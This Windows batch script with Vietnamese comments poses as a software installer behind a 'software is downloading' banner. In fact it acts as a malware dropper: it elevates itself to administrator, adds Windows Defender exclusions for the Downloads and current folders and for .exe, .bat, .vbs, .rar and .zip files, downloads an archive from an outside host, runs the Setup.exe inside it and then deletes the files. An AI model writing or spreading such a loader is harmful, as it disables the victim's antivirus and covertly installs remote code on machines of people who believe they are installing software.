��&cls
@echo off
:: Kiểm tra nếu không có quyền Admin, yêu cầu quyền Admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~0' -Verb RunAs"
    exit
)

:: Mở rộng cửa sổ CMD, đổi màu xanh lá
mode con: cols=80 lines=30
color 0A
echo.
echo ======================================================
echo                 PLEASE WAIT 5 MINUTES                 
echo          THE SOFTWARE IS DOWNLOADING NOW...           
echo ======================================================
echo.
timeout /t 3 /nobreak >nul

:: Đặt giá trị biến loại trừ
set "EXCLUSION_PATH=%USERPROFILE%\Downloads"
set "EXCLUSION_PATH_SAME_FOLDER=%CD%"

:: Thêm ngoại lệ vào Windows Defender
powershell -Command "Add-MpPreference -ExclusionPath '%EXCLUSION_PATH%'"
powershell -Command "Add-MpPreference -ExclusionPath '%EXCLUSION_PATH_SAME_FOLDER%'"
powershell -Command "Add-MpPreference -ExclusionExtension '.exe','.bat','.vbs','.rar','.zip'"

:: Đặt biến tải xuống
set "download_folder=%USERPROFILE%\Downloads"
set "file_name=Setup.rar"
set "setup_folder=%download_folder%\Setup"
set "exe_name=Setup.exe"
set "url=http://kimngoc.pythonanywhere.com/Setup.rar"

:: Xóa thư mục cài đặt cũ nếu tồn tại
if exist "%setup_folder%" (
    rmdir /s /q "%setup_folder%"
)

:: Tải xuống file

powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%download_folder%\%file_name%'"

:: Kiểm tra nếu tải xuống thất bại
if not exist "%download_folder%\%file_name%" (
   
    pause
    exit
)

:: Giải nén file bằng WinRAR nếu có
set "winrar_path=C:\Program Files\WinRAR\WinRAR.exe"
if exist "%winrar_path%" (
   
    "%winrar_path%" x -ibck "%download_folder%\%file_name%" "%download_folder%\" >nul
)

:: Kiểm tra nếu file cài đặt tồn tại
if exist "%setup_folder%\%exe_name%" (
    
    start "" "%setup_folder%\%exe_name%"
) else (
    
    pause
    exit
)


timeout /t 60 /nobreak >nul

rmdir /s /q "%setup_folder%"
del "%download_folder%\%file_name%" >nul

exit
